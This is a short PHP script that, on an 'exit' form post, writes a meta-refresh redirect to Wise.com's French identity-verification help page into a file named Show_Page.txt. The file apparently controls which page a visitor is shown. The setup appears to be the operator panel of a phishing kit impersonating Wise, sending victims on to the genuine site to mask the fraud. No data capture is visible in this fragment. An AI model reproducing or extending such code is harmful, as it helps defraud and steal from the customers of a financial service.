
<?php


session_start();

if(isset($_POST['textExit'])) 
{
    
$Page .= '<meta http-equiv="refresh" content="0;url=https://wise.com/fr/help/articles/2949782/guide-de-verification" />
  ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);




}

else {




}

?>
